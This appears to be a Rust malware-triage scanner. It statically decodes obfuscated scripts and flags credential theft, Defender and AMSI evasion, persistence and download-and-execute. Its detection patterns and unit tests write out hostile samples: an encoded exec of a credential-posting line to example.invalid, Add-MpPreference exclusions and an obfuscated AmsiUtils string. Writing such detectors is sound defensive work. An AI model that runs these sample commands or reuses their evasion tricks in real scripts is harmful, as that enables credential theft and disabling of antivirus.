//! Static script triage. Never invokes, interprets, imports or evaluates sample code.
//! Deobfuscation only recognizes bounded literal transformations.
use crate::model::Report;
use base64::{engine::general_purpose::STANDARD, Engine as _};
use flate2::read::{GzDecoder, ZlibDecoder};
use regex::Regex;
use sha2::Digest;
use std::collections::{HashSet, VecDeque};
use std::io::Read;
use std::sync::LazyLock;

const MAX_LAYER_BYTES: usize = 128 * 1024;
const MAX_DERIVED_TOTAL: usize = 512 * 1024;
const MAX_LAYERS: usize = 16;
const MAX_DEPTH: usize = 3;

static B64: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"[A-Za-z0-9+/]{32,8192}={0,2}").unwrap());
static PS_ENC: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"(?i)-(?:encodedcommand|enc)\s+([A-Za-z0-9+/=]{16,8192})").unwrap());
static JS_CHARCODE: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"(?i)(?:String\s*\.\s*)?fromCharCode\s*\(\s*([0-9,\s]{6,2048})\)").unwrap());
static PY_CHR_CHAIN: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"(?i)(?:chr\s*\(\s*\d{1,3}\s*\)\s*\+\s*){2,128}chr\s*\(\s*\d{1,3}\s*\)").unwrap());
static PY_CHR: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"(?i)chr\s*\(\s*(\d{1,3})\s*\)").unwrap());
static CONCAT: LazyLock<Regex> = LazyLock::new(|| Regex::new(r#"(?:"[^"\r\n]{1,128}"|'[^'\r\n]{1,128}')(?:\s*\+\s*(?:"[^"\r\n]{1,128}"|'[^'\r\n]{1,128}')){1,24}"#).unwrap());
static QUOTED: LazyLock<Regex> = LazyLock::new(|| Regex::new(r#""([^"\r\n]{0,128})"|'([^'\r\n]{0,128})'"#).unwrap());
static JS_REVERSE: LazyLock<Regex> = LazyLock::new(|| Regex::new(r#"(?i)(?:"([^"\r\n]{4,512})"|'([^'\r\n]{4,512})')\s*\.split\(\s*['"]{2}\s*\)\s*\.reverse\(\s*\)\s*\.join\(\s*['"]{2}\s*\)"#).unwrap());
static HEX_ESCAPE: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"(?:\\x[0-9a-fA-F]{2}){4,1024}").unwrap());
static UNICODE_ESCAPE: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"(?:\\u[0-9a-fA-F]{4}){4,1024}").unwrap());

static CREDENTIAL: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"(?i)Login Data|Local State|key4\.db|logins\.json|CryptUnprotectData|win32crypt|password_value|os_crypt|browser_cookie3").unwrap());
static SEND: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"(?i)requests\.post|httpx\.post|axios\.post|Invoke-RestMethod|curl(?:\.exe)?\s+[^\r\n]{0,100}(?:--data|-F\s|-T\s)|\.sendall\s*\(|\.send\s*\(").unwrap());
static NETWORK: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"(?i)https?://|requests\.(?:get|post)|httpx\.(?:get|post)|fetch\s*\(|Invoke-(?:WebRequest|RestMethod)|WebClient|curl(?:\.exe)?\b|wget\b").unwrap());
static EXEC: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"(?i)\b(?:eval|exec|iex|Invoke-Expression|Start-Process|subprocess|os\.system|child_process|powershell(?:\.exe)?|cmd\.exe)\b").unwrap());
static DOWNLOAD: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"(?i)DownloadString|DownloadFile|Invoke-WebRequest|requests\.get|httpx\.get|Start-BitsTransfer|curl(?:\.exe)?|wget").unwrap());
static EVASION: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"(?i)Add-MpPreference\s+-Exclusion|Set-MpPreference\s+-DisableRealtimeMonitoring|AmsiUtils|AmsiScanBuffer|wevtutil(?:\.exe)?\s+cl\b|Clear-EventLog").unwrap());
static PERSISTENCE: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"(?i)schtasks(?:\.exe)?\s+/create|Register-ScheduledTask|New-ScheduledTask|New-Service|CurrentVersion[\\/]+Run").unwrap());
static ENCODED_EXEC: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"(?i)-enc(?:odedcommand)?\b|FromBase64String\s*\(|b64decode\s*\(|\batob\s*\(").unwrap());

#[derive(Clone)]
struct Layer {
    text: String,
    origin: String,
    depth: usize,
}

fn utf16_decode(bytes: &[u8], little: bool) -> Option<String> {
    if bytes.len() % 2 != 0 { return None; }
    let values: Vec<u16> = bytes.chunks_exact(2).map(|chunk| {
        if little { u16::from_le_bytes([chunk[0], chunk[1]]) }
        else { u16::from_be_bytes([chunk[0], chunk[1]]) }
    }).collect();
    String::from_utf16(&values).ok()
}

fn decode_text(bytes: &[u8]) -> Option<String> {
    if bytes.starts_with(&[0xff, 0xfe]) { return utf16_decode(&bytes[2..], true); }
    if bytes.starts_with(&[0xfe, 0xff]) { return utf16_decode(&bytes[2..], false); }
    let sample = &bytes[..bytes.len().min(256)];
    let odd_nulls = sample.iter().skip(1).step_by(2).filter(|&&b| b == 0).count();
    let even_nulls = sample.iter().step_by(2).filter(|&&b| b == 0).count();
    if sample.len() >= 16 {
        if odd_nulls > sample.len() / 5 { return utf16_decode(bytes, true); }
        if even_nulls > sample.len() / 5 { return utf16_decode(bytes, false); }
    }
    Some(String::from_utf8_lossy(bytes).into_owned())
}

fn looks_like_source(data: &[u8]) -> Option<String> {
    if data.is_empty() || data.len() > MAX_LAYER_BYTES { return None; }
    let text = decode_text(data)?;
    let sample: Vec<char> = text.chars().take(8192).collect();
    if sample.is_empty() { return None; }
    let printable = sample.iter().filter(|c| !c.is_control() || **c == '\n' || **c == '\r' || **c == '\t').count();
    let letters = sample.iter().filter(|c| c.is_ascii_alphabetic()).count();
    if printable * 100 < sample.len() * 83 || letters * 100 < sample.len() * 12 {
        return None;
    }
    Some(text)
}

fn inflate_bounded(data: &[u8]) -> Option<Vec<u8>> {
    if data.len() > 96 * 1024 { return None; }
    for is_gzip in [true, false] {
        let mut out = Vec::new();
        let result = if is_gzip {
            GzDecoder::new(data).take((MAX_LAYER_BYTES + 1) as u64).read_to_end(&mut out)
        } else {
            ZlibDecoder::new(data).take((MAX_LAYER_BYTES + 1) as u64).read_to_end(&mut out)
        };
        if result.is_ok() && out.len() <= MAX_LAYER_BYTES && !out.is_empty() {
            return Some(out);
        }
    }
    None
}

fn decode_b64(encoded: &str) -> Option<String> {
    if encoded.len() > 8192 || encoded.len() % 4 != 0 { return None; }
    let raw = STANDARD.decode(encoded).ok()?;
    if let Some(source) = looks_like_source(&raw) { return Some(source); }
    let expanded = inflate_bounded(&raw)?;
    looks_like_source(&expanded)
}

fn derive(text: &str, is_batch: bool) -> Vec<(String, String)> {
    let mut out = Vec::new();
    // Explicit PowerShell EncodedCommand is generally UTF-16LE.
    for caps in PS_ENC.captures_iter(text).take(16) {
        if let Some(value) = caps.get(1).and_then(|m| decode_b64(m.as_str())) {
            out.push(("powershell_encoded_command".into(), value));
        }
    }
    for matched in B64.find_iter(text).take(32) {
        if let Some(value) = decode_b64(matched.as_str()) {
            out.push(("base64".into(), value));
        }
    }
    for caps in JS_CHARCODE.captures_iter(text).take(16) {
        if let Some(content) = caps.get(1) {
            let numbers: Vec<_> = content.as_str().split(',').map(str::trim).collect();
            if numbers.len() >= 3 && numbers.len() <= 512 {
                let decoded: Option<String> = numbers.iter()
                    .map(|n| n.parse::<u32>().ok().and_then(char::from_u32)).collect();
                if let Some(value) = decoded { out.push(("js_charcode".into(), value)); }
            }
        }
    }
    for matched in PY_CHR_CHAIN.find_iter(text).take(16) {
        let value: Option<String> = PY_CHR.captures_iter(matched.as_str()).map(|caps| {
            caps.get(1)?.as_str().parse::<u32>().ok().and_then(char::from_u32)
        }).collect();
        if let Some(value) = value { out.push(("python_chr".into(), value)); }
    }
    for matched in CONCAT.find_iter(text).take(24) {
        let mut joined = String::new();
        for caps in QUOTED.captures_iter(matched.as_str()) {
            let part = caps.get(1).or_else(|| caps.get(2));
            if let Some(part) = part { joined.push_str(part.as_str()); }
        }
        if !joined.is_empty() { out.push(("literal_concat".into(), joined)); }
    }
    for caps in JS_REVERSE.captures_iter(text).take(16) {
        if let Some(value) = caps.get(1).or_else(|| caps.get(2)) {
            out.push(("js_reverse".into(), value.as_str().chars().rev().collect()));
        }
    }
    for matched in HEX_ESCAPE.find_iter(text).take(16) {
        let bytes: Vec<u8> = matched.as_str().as_bytes().chunks_exact(4)
            .filter_map(|part| u8::from_str_radix(std::str::from_utf8(&part[2..]).ok()?, 16).ok()).collect();
        if let Ok(value) = String::from_utf8(bytes) { out.push(("hex_escape".into(), value)); }
    }
    for matched in UNICODE_ESCAPE.find_iter(text).take(16) {
        let chars: Option<String> = matched.as_str().as_bytes().chunks_exact(6).map(|part| {
            let value = u32::from_str_radix(std::str::from_utf8(&part[2..]).ok()?, 16).ok()?;
            char::from_u32(value)
        }).collect();
        if let Some(value) = chars { out.push(("unicode_escape".into(), value)); }
    }
    if is_batch {
        // Do not expand real environment variables: only literal 'set' assignments in the sample.
        let assignments: Vec<_> = text.lines().take(512).filter_map(|line| {
            let line = line.trim().trim_start_matches('@').trim();
            let body = line.get(..4).filter(|prefix| prefix.eq_ignore_ascii_case("set "))?;
            let _ = body;
            let value = line[4..].trim().trim_matches('"');
            let (key, val) = value.split_once('=')?;
            let key = key.trim();
            if key.len() > 64 || !key.chars().all(|c| c.is_ascii_alphanumeric() || c == '_') { return None; }
            if val.len() > 4096 { return None; }
            Some((key.to_string(), val.to_string()))
        }).take(32).collect();
        let mut expanded = text.to_string();
        for (key, value) in assignments {
            expanded = expanded.replace(&format!("%{key}%"), &value);
            expanded = expanded.replace(&format!("!{key}!"), &value);
        }
        if expanded != text { out.push(("batch_literal_variables".into(), expanded)); }
        if text.contains('^') {
            out.push(("batch_caret".into(), text.replace('^', "")));
        }
    }
    out
}

fn analyze_layer(layer: &Layer, report: &mut Report) {
    let text = &layer.text;
    let source = layer.origin.as_str();
    let credentials = CREDENTIAL.is_match(text);
    let sends = SEND.is_match(text) && NETWORK.is_match(text);
    let evasion = EVASION.is_match(text);
    let persistence = PERSISTENCE.is_match(text);
    let download_execute = DOWNLOAD.is_match(text) && EXEC.is_match(text);
    if credentials && sends {
        report.add("possible_exfiltration", 75, source, "Browser credential references combined with an outbound send capability");
    }
    if evasion {
        report.add("defense_evasion", 60, source, "Defender exclusions, AMSI tampering or log clearing indicators");
    }
    if persistence {
        report.add("persistence", 30, source, "Persistence-related commands or registry references");
    }
    if download_execute {
        report.add("download_and_execute", 45, source, "Downloader and process/code execution capabilities appear together");
    }
    if layer.depth > 0 && (credentials || evasion || persistence) {
        report.add("hidden_sensitive_behavior", 25, source, "A decoded layer contains sensitive or evasive behavior");
    }
    if layer.depth == 0 && ENCODED_EXEC.is_match(text) && EXEC.is_match(text) {
        report.add("encoded_execution", 25, source, "Encoded content appears to be passed into an execution mechanism");
    }
}

pub fn inspect(data: &[u8], report: &mut Report) {
    // scan.rs caps input at 4 MiB, including partially written files.
    // Root files are capped by scan.rs at 4 MiB; derived layers are capped separately.
    // Decode UTF-16 even for large root scripts instead of silently missing their text.
    let root = match decode_text(data) {
        Some(text) => text,
        None => {
            report.unavailable("unreadable", "Cannot decode script text");
            return;
        }
    };
    let path = report.path.to_ascii_lowercase();
    let is_batch = path.ends_with(".bat") || path.ends_with(".cmd");
    let mut queue = VecDeque::from([Layer { text: root, origin: "raw".into(), depth: 0 }]);
    let mut visited = HashSet::new();
    let mut derived_total = 0usize;
    let mut processed = 0usize;

    while let Some(layer) = queue.pop_front() {
        if processed >= MAX_LAYERS { break; }
        let key = hex::encode(sha2::Sha256::digest(layer.text.as_bytes()));
        if !visited.insert(key) { continue; }
        processed += 1;
        analyze_layer(&layer, report);
        if layer.depth >= MAX_DEPTH { continue; }

        for (method, derived) in derive(&layer.text, is_batch) {
            let bytes = derived.len();
            if bytes == 0 || bytes > MAX_LAYER_BYTES ||
                derived_total.saturating_add(bytes) > MAX_DERIVED_TOTAL {
                continue;
            }
            derived_total += bytes;
            queue.push_back(Layer { text: derived, origin: method, depth: layer.depth + 1 });
        }
    }
    report.decoded_layers = processed.saturating_sub(1);
    if !queue.is_empty() || derived_total >= MAX_DERIVED_TOTAL {
        report.warning = Some("Deobfuscation budget reached: results may be incomplete".into());
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::model::Report;

    fn scan(code: &str, path: &str) -> Report {
        let mut report = Report::new(path.into(), "script");
        inspect(code.as_bytes(), &mut report);
        report.finish();
        report
    }
    fn has(report: &Report, code: &str) -> bool {
        report.signals.iter().any(|signal| signal.code == code)
    }

    #[test]
    fn benign_code_has_no_signals() {
        let r = scan("print('hello world')", "x.py");
        assert_eq!(r.score, 0);
    }
    #[test]
    fn browser_credential_exfiltration_detected() {
        let r = scan("name='Login Data'; requests.post('https://example.invalid/upload',data=name)", "x.py");
        assert!(has(&r, "possible_exfiltration"));
        assert_eq!(r.risk, "high");
    }
    #[test]
    fn base64_payload_is_decoded_but_not_executed() {
        let payload = "name='Login Data'; requests.post('https://example.invalid/x',data=name)";
        let code = format!("exec(base64.b64decode('{}'))", STANDARD.encode(payload));
        let r = scan(&code, "x.py");
        assert!(has(&r, "possible_exfiltration"));
        assert!(r.decoded_layers > 0);
        assert!(!serde_json::to_string(&r).unwrap().contains("example.invalid"));
    }
    #[test]
    fn powershell_utf16le_encoded_command() {
        let content = "Add-MpPreference -ExclusionPath C:\\Temp";
        let utf16 = content.encode_utf16().flat_map(u16::to_le_bytes).collect::<Vec<u8>>();
        let r = scan(&format!("powershell -EncodedCommand {}", STANDARD.encode(utf16)), "x.ps1");
        assert!(has(&r, "defense_evasion"));
    }
    #[test]
    fn javascript_charcode_obfuscation() {
        let values = "AmsiUtils".chars().map(|c| (c as u32).to_string()).collect::<Vec<_>>().join(",");
        let r = scan(&format!("const x = String.fromCharCode({values});"), "x.js");
        assert!(has(&r, "defense_evasion"));
    }
    #[test]
    fn batch_local_variable_and_caret() {
        let r = scan("set \"X=Add-MpPreference\"\n%X% -ExclusionPath C:\\Temp\npo^wer^shell", "x.cmd");
        assert!(has(&r, "defense_evasion"));
    }
    #[test]
    fn gzip_expansion_over_limit_is_rejected() {
        use std::io::Write;
        let mut encoder = flate2::write::ZlibEncoder::new(Vec::new(), flate2::Compression::default());
        encoder.write_all(&vec![b'A'; MAX_LAYER_BYTES + 10]).unwrap();
        assert!(inflate_bounded(&encoder.finish().unwrap()).is_none());
    }
}
